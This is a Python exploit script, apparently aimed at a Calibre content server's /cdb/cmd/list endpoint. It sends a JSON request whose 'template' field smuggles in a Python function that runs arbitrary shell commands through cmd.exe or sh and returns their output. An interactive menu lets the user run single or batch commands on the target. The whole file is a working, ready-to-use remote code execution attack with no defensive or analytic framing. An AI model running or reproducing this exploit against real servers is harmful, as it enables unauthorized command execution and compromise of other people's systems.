import json
import sys
import requests

_target = "http://localhost:8080"

def banner():

    """Display the banner of the tool."""
    banner_text = """ 
  ______             __  __  __                           
 /      \           /  |/  |/  |                          
/$$$$$$  |  ______  $$ |$$/ $$ |____    ______    ______  
$$ |  $$/  /      \ $$ |/  |$$      \  /      \  /      \ 
$$ |       $$$$$$  |$$ |$$ |$$$$$$$  |/$$$$$$  |/$$$$$$  |
$$ |   __  /    $$ |$$ |$$ |$$ |  $$ |$$ |  $$/ $$    $$ |
$$ \__/  |/$$$$$$$ |$$ |$$ |$$ |__$$ |$$ |      $$$$$$$$/ 
$$    $$/ $$    $$ |$$ |$$ |$$    $$/ $$ |      $$       |
 $$$$$$/   $$$$$$$/ $$/ $$/ $$$$$$$/  $$/        $$$$$$$/ 
                                                          """
    print(banner_text)
    print("hello,This script was developed by Alex.")
def exploit(cmd):
    """Sends a command to the server and returns the output."""
    payload = f"python:def evaluate(a, b):\n import subprocess\n try:\n return subprocess.check_output(['cmd.exe', '/c', '{cmd}']).decode()\n except Exception:\n return subprocess.check_output(['sh', '-c', '{cmd}']).decode()"

    try:
        r = requests.post(
            f"{_target}/cdb/cmd/list",
            headers={"Content-Type": "application/json"},
            json=[
                ["template"],
                "",  # sortby: leave empty
                "",  # ascending: leave empty
                "",  # search_text: leave empty, set to all
                1,  # limit results
                payload,  # payload
            ],
        )

        # Check if response contains expected structure
        if r.status_code == 200 and "result" in r.json():
            output = list(r.json()["result"]["data"]["template"].values())[0]
            print(f"Command Output: {output}")
        else:
            print(f"Unexpected response structure: {r.text}")

    except requests.exceptions.RequestException as e:
        print(f"HTTP Request failed: {e}")
    except Exception as e:
        print(f"An error occurred: {e}")


def execute_commands(commands):
    """Executes a list of commands."""
    for cmd in commands:
        print(f"Executing command: {cmd}")
        exploit(cmd)


if __name__ == "__main__":
    banner()
    while True:
        mode = input("Choose mode: [1] Single Command [2] Batch Command [q] Quit: ").strip()
        if mode == '1':
            command = input("Enter command to execute: ")
            exploit(command)
        elif mode == '2':
            commands = input("Enter commands separated by commas: ").strip().split(',')
            commands = [cmd.strip() for cmd in commands]  # Clean whitespace
            execute_commands(commands)
        elif mode.lower() == 'q':
            print("Exiting...")
            sys.exit(0)
        else:
            print("Invalid option. Please try again.")
